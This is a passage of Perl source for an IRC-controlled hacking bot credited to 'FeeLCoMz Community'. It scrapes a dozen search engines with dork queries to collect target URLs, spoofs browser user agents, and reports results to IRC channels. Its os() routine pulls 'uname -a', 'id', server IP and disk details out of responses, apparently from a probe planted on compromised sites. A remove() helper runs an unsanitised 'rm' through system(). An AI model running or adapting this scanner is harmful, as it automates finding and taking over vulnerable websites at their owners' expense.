		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ /class=\"next\"/) {
		msg3("5(!)12 No more on Uol!");
		return @list;
	}	
    }
    return @list;
}
## MAMMA ##
sub mamma(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1000; $p += 50) {
	my $re = query("http://mamma.com/Mamma?utfout=1&query=".key($key)."&qtype=0&rpp=50&cb=Mamma&index=".$p);
	while ($re =~ m/http:\/\/(.+?)\<\/span>/g) {
	    my $k = $1;
	    my @grep = links($k);
	    open( $filez, ">>", $name );
	    #open( $nf, ">>", "mamma.txt");
	    foreach my $k (@grep) {
		print $filez "$k\n";
		#print $nf "$k\n";
	    }
	    close $filez;
	    #close $nf;
	    push(@list, @grep);
	}
	if ($re !~ /Next<\/font>/) {
		msg3("5(!)12 No more on Mamma!");
		return @list;
	}
    }
    return @list;
}
## HOTBOT ##
sub hotbot(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p < 100; $p++) {
	my $re = query("http://www.hotbot.com/?query=".key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$p);
	while ($re =~ m/<a href=\"http:\/\/(.*?)\"  onmouseover/g) {
	    my $k = $1;
	    if ($k !~ /hotbot/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "hotbot.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ /<p class=\"nxt\">/) {
		msg3("5(!)12 No more on Hotbot!");
		return @list;
	}
    }
    return @list;
}
## LYCOS ##
sub lycos(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 100; $p++) {
	my $re = query("http://search.lycos.com/?query=".key($key)."&page2=".$p."&tab=web");	
	while ($re =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
	    my $k = $1;
	    if ($k !~ /lycos|hotbot/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "lycos.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

## CLUSTY ##
sub clusty(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p < 1000; $p += 100) {
	my $re = query("http://clusty.com/search?query=".key($key)."&v:state=root|root-".$p."-100|0");
	while ($re =~ m/<a target=\"_top\" href=\"http:\/\/([^>\"]*)/g) {
	    my $k = $1;
	    if ($k !~ /clusty/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "clusty.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ /<a class=\"listnext\"/) {
		msg3("5(!)12 No more on Clusty!");
		return @list;
	}
    }
    return @list;
}

sub dmoz(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1000; $p += 20) {
	my $re = query("http://dmoz.org/search?search=".key($key)."&utf8=1&start=".$p);
	while ($re =~ m/<li><a href=\"http:\/\/(.*?)\"/g) {		
	    my $k = $1;
	    if ($k !~ /clusty/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "dmoz.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ />Next<\/a>/) {
		msg3("5(!)12 No more on dmoz!");
		return @list;
	}
    }
    return @list;
}

sub webcrawler(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    my $b = 0;
    for ($p = 0;$p <= 5000; $p += 100) {
    	$b++;
	my $re = query("http://www.webcrawler.com/webcrawler/ws/redir/qcat=Web/qkw=".key($key)."/qcoll=relevance/zoom=off/bepersistence=true/qi=".$p."/qk=50/page=".$b."/_iceUrlFlag=11?_IceUrl=true");
	while ($re =~ m/http:\/\/(.*?)/g) {
	    my $k = $1;
	    if ($k !~ /webcrawler|google/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "webcrawler.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ /wsPagerNext/) {
		msg3("5(!)12 No more on Webcrawler!");
		return @list;
	}
    }
    return @list;
}

sub fazzle(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 10; $p++) {
	my $re = query("http://www.fazzle.com/search?SearchString=feelcomz");
	while ($re =~ m/<a Class=clsLink href=\"http:\/\/(.*?)\"/g) {
	    my $k = $1;
	    if ($k !~ /fazzle/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "fazzle.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

sub about(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 10; $p++) {
	my $re = query("http://search.about.com/fullsearch.htm?terms=".key($key)."&pg=".$p."&SUName=www");
	while ($re =~ m/<a href=\"http:\/\/(.*?)\"/g) {
	    my $k = $1;
	    if ($k !~ /search.about/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "about.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

sub netscape(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 10; $p++) {
	#my $re = query("http://search.netscape.com/search/search?query=".key($key)."&page=".$p."&nt=null&y=0&fromPage=NSCPIndex&x=0&st=webresults");
	my $re = query("http://search.netscape.com/search/search?query=".key($key)."&page=".$p."&y=0&x=0&st=webresults");
	while ($re =~ m/url\">http:\/\/(.*?)<\/p>/g) {		
	    my $k = $1;
	    if ($k !~ /search.netscape/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "netscape.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

sub infospace(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 5; $p++) {
	my $re = query("http://msxml.infospace.com/home/search/web/".key($key));	
	while ($re =~ m/rawto=http:\/\/(.*?)/g) {		
	    my $k = $1;
	    if ($k !~ /infospace/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "netscape.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

##########################
## END OF SEARCH ENGINE ##
##########################

sub remove() { my $file = $_[0];system("rm $file"); }

sub clean () {
    $dork = $_[0];
    if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
	msg1("12[i]5 Cleaning Dork from Google Search Keys..");
	$dork =~ s/^inurl://g;
	$dork =~ s/^allinurl://g;
	$dork =~ s/^intext://g;
	$dork =~ s/^allintext://g;
	$dork =~ s/^intitle://g;
	$dork =~ s/^allintitle://g;
    }
    return $dork;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->agent($user_agent[rand(scalar(@user_agent))]);
    $ua->timeout(3);
    my $response = $ua->request($req);
    return $response->content;
}

sub query1() {
    my $url = $_[0];
    my $host  = $url;
    my $query = $url;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    eval {
	$uagent = $user_agent[rand(scalar(@user_agent))];
	my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
	print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: ".$uagent."\r\n\r\n";
	my @r = <$sock>;
	$page = "@r";
	close($sock);
    };
    return $page;
}

sub query2() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->timeout(3);
    my $response = $ua->request($req);
    return $response->content;
}

sub os() {
    my $site = $_[0];
    my $ret  = &query($site);
    while ( $ret =~ m/<br>uname -a:(.+?)\<br>/g ) { $un = $1; }
    while ( $ret =~ m/<br>os:(.+?)\<br>/g ) { $os = $1; }
    while ( $ret =~ m/<br>id:(.+?)\<br>/g ) { $id1 = $1; }
    while ( $ret =~ m/<br>srvip:(.+?)\<br>/g ) { $ip1 = $1; }
    while ( $ret =~ m/<br>srvname:(.+?)\<br>/g ) { $nm1 = $1; }
    while ( $ret =~ m/<br>free:(.+?)\<br>/g ) { $free = $1; }
    while ( $ret =~ m/<br>used:(.+?)\<br>/g ) { $used = $1; }
    while ( $ret =~ m/<br>total:(.+?)\<br>/g ) { $all = $1; }
}

sub unici() {
  my @unici = ();
  my %visti = ();
  #open($nf, ">>", "cleaned.txt");
  foreach my $elemento(@_) {
    $elemento =~ s/\/+/\//g;
    next if $visti{$elemento}++;
    push @unici, $elemento;
    #print $nf "$elemento\r\n";
  }
  #close ($nf);
  return @unici;
}

sub uagent() {
  my @ret = (
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
 );
 return(@ret);
}

## RAW IRC COMMANDS ##
sub msg1 () { my $isi = $_[0];print $sock "PRIVMSG $chan1 :$isi\n"; }
sub msg2 () { my $isi = $_[0];print $sock "PRIVMSG $chan2 :$isi\n"; }
sub msg3 () { my $isi = $_[0];print $sock "PRIVMSG $chan3 :$isi\n"; }
sub msgr () { 
	my $se = $_[0];
	my $totr =  $_[1];
	my $clr = $_[2];
	print $sock "PRIVMSG $chan1 :13,1 [$se]:15 $totr 0�13 $clr \n";
}
sub priv1 () { my $isi = $_[0];print $sock "PRIVMSG $admin :$isi\n"; }
sub join1 () { my $isi = $_[0];print $sock "JOIN $isi\n"; }

########################
## FeeLCoMz Community ##
########################

